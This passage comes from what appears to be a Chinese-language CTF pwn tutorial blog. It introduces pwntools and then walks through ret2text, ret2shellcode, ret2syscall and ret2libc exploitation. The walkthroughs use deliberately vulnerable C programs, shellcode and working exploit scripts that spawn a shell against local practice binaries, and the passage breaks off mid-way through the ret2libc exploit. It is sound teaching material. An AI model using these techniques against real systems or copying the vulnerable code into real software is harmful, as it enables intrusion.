process(&#x27;./test_pwn_file&#x27;)</span></span><br><span class="line"><span class="string">process用来启动一个本地进程，需要注意.elf不能在windows下运行，应在wsl或者虚拟机里，否则程序会报错，.exe等亦然，所以本地打的话记得脚本在匹配的环境里执行</span></span><br><span class="line"><span class="string">process里是文件路径，其中 &#x27;test_pwn_file&#x27; 是文件名</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.sh())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">asm()接收一个字符串，返回汇编码的机器码(bytes)</span></span><br><span class="line"><span class="string">比如:</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>asm(&#x27;mov eax, 0x10&#x27;)</span></span><br><span class="line"><span class="string">b&#x27;\xb8\x10\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="string">shellcraft模块是shellcode的模块，包含一些生成shellcode的函数</span></span><br><span class="line"><span class="string">这里shellcraft.sh()就是执行/bin/sh的shellcode</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>asm(shellcraft.sh())</span></span><br><span class="line"><span class="string">b&#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.interactive()</span><br><span class="line"><span class="comment"># 将控制权还给用户，即用户可在终端直接与进程交互</span></span><br><span class="line"><span class="comment"># 在getshell之后使用，一般就放在脚本最后就行了</span></span><br></pre></td></tr></table></figure><h4 id="send-or-receive"><a href="#send-or-receive" class="headerlink" title="send or receive"></a>send or receive</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">io.send(payload)<span class="comment"># 将payload发送到远程连接</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;payload叫攻击载荷，实际上就是你要发送的数据，叫这个名字只是惯例了，你也可以叫其他任何合法的变量名&#x27;&#x27;&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># 与send相比是在发送完payload后会多发送一个回车(&#x27;\n&#x27;)</span></span><br><span class="line">io.sendafter(message, payload)</span><br><span class="line">io.sendlineafter(message, payload)</span><br><span class="line"><span class="comment"># 这两个很好理解，就是在接收到message之后再发送payload</span></span><br><span class="line"><span class="comment"># message不需要是接受到的一整个消息，可以是其中的片段</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">io.recv()</span><br><span class="line"><span class="comment"># 接收所有数据，返回接收到的数据</span></span><br><span class="line"><span class="comment"># 可以接收一个int参数，表示接收多少个字节</span></span><br><span class="line"><span class="comment"># recv(6) 就表示接收6个字节</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">比如你收到了一段消息: b&#x27;hello,world!&#x27;</span></span><br><span class="line"><span class="string">recv(6) 就会返回 b&#x27;hello,&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.recvuntil(message)</span><br><span class="line"><span class="comment"># 接收到message后停止接收，返回包含message在内的全部数据</span></span><br><span class="line"><span class="comment"># 可以指定一个drop: bool参数，默认为False，若为True则只返回message之前的数据(message被抛弃了)</span></span><br><span class="line"><span class="comment"># 当然如果你继续接收数据的话是不会重新接收一遍message了，只会从message之后继续接收</span></span><br><span class="line">io.recvline()</span><br><span class="line"><span class="comment"># 接收一行数据并返回，等价于 recvuntil(b&#x27;\n&#x27;)</span></span><br></pre></td></tr></table></figure><p><strong>上述发送和接收的方法均能接受<code>str</code>或<code>bytes</code>类型的参数</strong></p><h4 id="数据打包"><a href="#数据打包" class="headerlink" title="数据打包"></a>数据打包</h4><p>pwntools里封装了pack和unpack函数</p><p>一般用对应的简称：</p><p>打包 <code>p16/p32/p64</code>: 把一个整数分别打包为16，32或64位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p64(<span class="number">0x7ffff3283296</span>)</span><br><span class="line"><span class="string">b&#x27;\x962(\xf3\xff\x7f\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># 即 b&#x27;\x96\x32\x28\xf3\xff\x7f\x00\x00&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p16(<span class="number">0x256</span>)</span><br><span class="line"><span class="string">b&#x27;V\x20&#x27;</span></span><br><span class="line"><span class="comment"># 即 b&#x27;\x56\x02&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p32(<span class="number">0x8004082</span>)</span><br><span class="line"><span class="string">b&#x27;\x82@\x00\x08</span></span><br><span class="line"><span class="string"># 即 b&#x27;</span>\x82\x40\x00\x08<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>解包 <code>u16/u32/u64</code>: 解包一个字符串（或bytes），得到整数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">`<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">要注意u16,u32,u64接受的参数分别要是2，4，8个字节，否则会报错</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>addr1 = <span class="string">b&#x27;\x962(\xf3\xff\x7f&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>u64(addr1)<span class="comment"># Error!!!</span></span><br><span class="line">...</span><br><span class="line">struct.error: unpack requires a buffer of <span class="number">8</span> <span class="built_in">bytes</span></span><br><span class="line"><span class="comment"># 一般接受数据不确定有多长就可以用ljust来补到8个字节</span></span><br><span class="line"><span class="comment"># 类似的有zfill，rjust等，可以自行体会其中差异</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(u64(addr1).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x7ffff3283296&#x27;</span></span><br></pre></td></tr></table></figure><p>需要注意：如果待延长的数据是 <code>bytes</code>，<code>ljust</code>第二个参数也必须<code>bytes</code><br>如上例就是必须是 <code>b&#39;\x00&#39;</code>或者<code>b&#39;\0&#39;</code>, 不能是 <code>&#39;\x00&#39;</code>, <code>&#39;\0&#39;</code><br>如果是 <code>str</code> 类型也是一样道理</p><p><del><strong>当然如果你用 python2 就当我没说</strong></del></p><h4 id="输出数据"><a href="#输出数据" class="headerlink" title="输出数据"></a>输出数据</h4><p>输出当然可以用 <code>print</code></p><p>只不过建议用pwntools自带的输出方式，一方面吻合pwntools本来的格式，一方面看着比较舒适</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>out_str = <span class="string">&#x27;hello, world&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>log.info(out_str)</span><br><span class="line">[*] hello, world</span><br><span class="line"><span class="comment"># info代表log等级，也可以用其他的</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = log.progress(<span class="string">&#x27;Working&#x27;</span>)</span><br><span class="line">[x] Working</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.status(<span class="string">&#x27;Reticulating splines&#x27;</span>)</span><br><span class="line">[x] Working: Reticulating splines</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.success(<span class="string">&#x27;Get a shell!&#x27;</span>)</span><br><span class="line">[+] Working: Get a shell!</span><br><span class="line"><span class="comment"># 要注意如果p使用了success之后，就不能再用p输出了，当然不至于报错</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.status(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">no output</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.success(<span class="string">&#x27;you did&#x27;</span>)</span><br><span class="line">no output</span><br><span class="line"><span class="comment"># 不过直接用success是可以的</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>success(<span class="string">&#x27;you did&#x27;</span>)</span><br><span class="line">[+] you did</span><br></pre></td></tr></table></figure><h4 id="Cyclic-pattern"><a href="#Cyclic-pattern" class="headerlink" title="Cyclic pattern"></a>Cyclic pattern</h4><p>使用pwntools生成一个pattern（一个str），可以通过其中的一部分数据定位其在一个字符串的位置</p><p>做栈溢出题目时，pattern可以减少计算溢出点的时间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cyclic(<span class="number">0x100</span>)<span class="comment"># 生成长度0x100的pattern</span></span><br><span class="line">cyclic_find(<span class="number">0x61616161</span>)<span class="comment"># 查找该数据在pattern的位置</span></span><br><span class="line">cyclic_find(<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment"># 可以用字符串查找</span></span><br><span class="line"><span class="comment"># 或者 cyclic -l 0x61616161</span></span><br><span class="line"><span class="comment"># 注: 在pwndbg中使用</span></span><br></pre></td></tr></table></figure><p>比如溢出时构造 <code>cyclic(0x100)</code> ，或者更长，输入后 PC的值变味了 <code>0x61616161</code> 通过 <code>cyclic_find(0x61616161) </code> 就可以得到从哪一个字节开始会控制PC寄存器</p><h4 id="ELF文件操作"><a href="#ELF文件操作" class="headerlink" title="ELF文件操作"></a>ELF文件操作</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">[*] <span class="string">&#x27;/mnt/d/myCTFground/Pwn/Signin/ez_stack&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><p>使用ipython或者log_level &#x3D; ‘debug’ 的话就相当于是checksec了，</p><p>我们加载elf文件主要是为了获取一些符号信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.address)</span><br><span class="line"><span class="string">&#x27;0x400000&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;0x401040&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;0x404008&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;0x401040&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>libc = ELF(<span class="string">&#x27;../libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__())</span><br><span class="line"><span class="string">&#x27;0x1b45bd&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="babyROP"><a href="#babyROP" class="headerlink" title="babyROP"></a>babyROP</h2><h3 id="什么是ROP"><a href="#什么是ROP" class="headerlink" title="什么是ROP"></a>什么是ROP</h3><p>类似于比较常听到的OOP（面向对象编程），POP（面向过程编程），FP（函数式编程）等。</p><p>ROP全称是Return-Oriented Programing（面向返回编程）。简单来说，<strong>ROP就是将源程序中散落的汇编程序片段（也称gadget）“拼接”在一起，使其能够为攻击者服务</strong>。 需要指出的是，此处的“拼接”不是指将这些汇编程序片段聚集在某个连续的内存空间中，而是让它们在逻辑上连续执行，也就是说构成一个”返回链“。ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。</p><h3 id="为什么要ROP"><a href="#为什么要ROP" class="headerlink" title="为什么要ROP"></a>为什么要ROP</h3><p>ROP主要是为了绕过NX(DEP)保护。<strong>NX(DEP)基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode，程序会尝试在数据页面执行指令，此时CPU就会抛出异常，而不是执行恶意指令。</strong>NX开启后，直接往栈上或堆上注入代码的方式难以继续发挥效果，所以有了各种绕过方法，rop是其中一种。</p><p>rop攻击一般要满足：</p><p>1）程序存在溢出，并且可以控制返回地址。</p><p>2）可以找到满足条件的gadget以及对应的gadget地址（如果gadget每次地址是不固定的，就要想办法动态获取对应地址了）</p><h3 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h3><h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>ret2text（ret to text）实际上就是一种ROP，只不过只返回一次而已（返回到text上），ret2text本质就是控制ret返回到已有的代码上如：system(“&#x2F;bin&#x2F;sh”)， execv(“&#x2F;bin&#x2F;sh”)，从而getshell。</p><p>写了一个简单的程序作为例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x20</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>PS：编译时记得关掉canary和地址随机化</strong></p><p>建议直接在wsl里编译就好（懒得开虚拟机捏~）</p><p><code>gcc -o pwn -fno-stack-protector -no-pie pwn.c</code></p><p>scanf处没有对读取数据长度做检测，存在溢出</p><p>不过直接说可能不好理解，看一下ida吧</p><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2text_main.png" alt="main"></p><p>栈空间：</p><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2text_stack.png" alt="stack"></p><p>显然这里输入到了v4(对应到栈里面的var_30)，发现跟预想的0x20不一样，偷偷加了一些空间，而且多创建了一个不知道干什么的int变量。使用实际要填充的长度应该是</p><p><code>offset = 0x2c + 0x4 + 0x8 = 0x38</code></p><p>这里的0x2c是var_30的大小（可以看到左边一列数那里0x30和4相差了0x2c（不是26嗷））；</p><p>然后4个字节长度是var_4，也就是那个int变量的，这里是直接覆盖过去了；</p><p>然后后面的8个字节是rbp（i386就是4个字节（ebp）），可以看到s和r那里相差了8；</p><p>然后再覆盖新的返回地址（如果有后门函数就返回到那里就好了）</p><p>再一眼后门函数</p><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2text_binsh.png" alt="binsh"></p><p>发现&#x2F;bin&#x2F;sh字符串在0x401144传参，所以就返回到0x401144，于是写出exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0x401144</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h4><p>即控制程序执行shellcode代码，shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell。<strong>一般来说，shellcode要我们自己填充。</strong></p><p>在栈溢出的基础上，要执行shellcode，需要shellcode所在区域有可执行权限。（没有NX保护，或者用mprotect（）为一段区域赋予了可执行权限，或者bss段可执行）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    mprotect(<span class="number">0x401000</span>, <span class="number">0x1000</span>, <span class="number">7</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(<span class="number">0x401000</span>, buf);</span><br><span class="line">    ((<span class="type">void</span>(*)())<span class="number">0x401020</span>)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码就是把0x401000开始的长度为0x1000的区域标记为可执行，我们直接把shellcode传进去，即可getshell，由于copy发生在0x401000，但是从0x401020开始执行，所以我们先填充0x20各字节再填充shellcode</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><p>简单来说就是执行系统调用来实现想要实现的功能，比如可以用 <code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code> 系统调用来获取shell，这需要满足：</p><ul><li><p>系统调用号，eax 为 0xb(x86) &#x2F; rax 为 0x3b(x64)</p></li><li><p>第一个参数，ebx &#x2F; rdi 为 &#x2F;bin&#x2F;sh 地址</p></li><li><p>第二个参数，ecx 为 0 &#x2F; rsi 为 0</p></li><li><p>第三个参数，edx 为 0 &#x2F; rdx 为 0</p></li><li><p>最后返回 int 0x80(x86) &#x2F; syscall ret(x64)</p><p>看一道例题：<a href="../resources/pwn_asset/study/ret2sys_64" target="_blank">ret2sys_64</a></p></li></ul><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2sys_main.png" alt="main"></p><p>程序里面没有现成的&#x2F;bin&#x2F;sh，所以可以用两次系统调用，一次读字符串，一次拿sh</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./ret2sys_64&#x27;</span>)</span><br><span class="line">rax = <span class="number">0x46b9f8</span></span><br><span class="line">rdi = <span class="number">0x4016c3</span></span><br><span class="line">rdx_rsi = <span class="number">0x4377f9</span></span><br><span class="line">syscall = <span class="number">0x45bac5</span></span><br><span class="line">bss = <span class="number">0x6c1c60</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span></span><br><span class="line"><span class="comment"># 调用sys_read，用来读取后面输入的/bin/sh到bss段</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">0</span>) + p64(rdi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_rsi) + p64(<span class="number">0x10</span>) + p64(bss) + p64(syscall)</span><br><span class="line"><span class="comment"># 调用execve来getshell</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">0x3b</span>) + p64(rdi) + p64(bss)</span><br><span class="line">payload += p64(rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;system_x64&#x27;</span>, payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>当不知道题目libc版本<del>（现在的ctf应该不会还有比赛不给libc吧，不会吧不会吧~）</del>，并且存在足够的溢出空间，是可以通过泄露函数地址（实际上只需要低三位数字）来查找libc版本，<strong>当然知道libc版本可能也会需要leak基地址来计算system等函数的地址</strong></p><p>这里建议使用py的LibcSearcher库，这个库是在线查找的（也就是要联网），<del><em>也可以本地一个一个试</em></del></p><p>ret2libc的思路是寻找程序中的gadget构造ROP，来调用程序中的输出函数如：puts，write，打印一些函数的地址，从而达到泄露基地址的目的</p><p><strong>例题：</strong><a href="../resources/pwn_asset/study/ret2libc_x64" target="_block">MoeCTF2022_ret2libc</a></p><p>在vuln函数里面就是一个简单的栈溢出，溢出长度足够构造ROP</p><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2libc_vuln.png" alt="vuln"></p><p>覆盖的长度为0x40+0x8（rbp）&#x3D;0x48</p><p>然后由于x64前六个参数用寄存器传，多的才是和x86一样栈传参，这前六个参数依次用rdi，rsi，rcx，rdx，r8，r9寄存器</p><p>这里我们目的是通过puts函数来输出puts的got表中的地址来泄露puts的真实地址。</p><p>所以要把puts_got作为参数传进puts函数里，也就是要用到rdi寄存器。<strong>（找gadget可以用ROPgadget）</strong></p><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2libc_rdi.png" alt="findrdi"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rdi = <span class="number">0x40117e</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># .got指向函数在libc的真实地址</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># 也可以elf.sym[&#x27;puts&#x27;]，因为.plt存的就是函数的符号信息</span></span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;main&#x27;</span>]) <span class="comment"># 也可以填vuln函数地址，只要保证再用一次read就行</span></span><br></pre></td></tr></table></figure><p>然后接收打印的地址，在查找libc版本，然后计算system，字符串&#x2F;bin&#x2F;sh的地址，就可以构造第二个payload</p><p><strong>要注意：ubuntu18以上版本调用系统函数要栈对齐，一般在传参前加个ret的gadget就行</strong></p><p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2libc_ret.png" alt="findret"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) <span class="comment"># 这么写是因为一般以\x7f结尾的6个字节</span></span><br><span class="line"></span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">libc = get_libc(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">如果是给了你libc文件，本地加载时用ELF()就行，用法自然跟上面LibcSearcher的不一样</span></span><br><span class="line"><span class="string">example:</span></span><br><span class="line"><span class="string">libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="string">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">sys_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + libc.search(b&#x27;/bin/sh&#x27;).__next__() @py3</span></span><br><span class="line"><span class="string">#libc.search(&#x27;/bin/sh&#x27;).next() @py2</span></span><br><span class="line"><span class="string">py3中search()的参数必须是bytes，然后next方法多了下划线</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(ret) + p64(rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br></pre></td></tr></table></figure><p><strong>完整exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 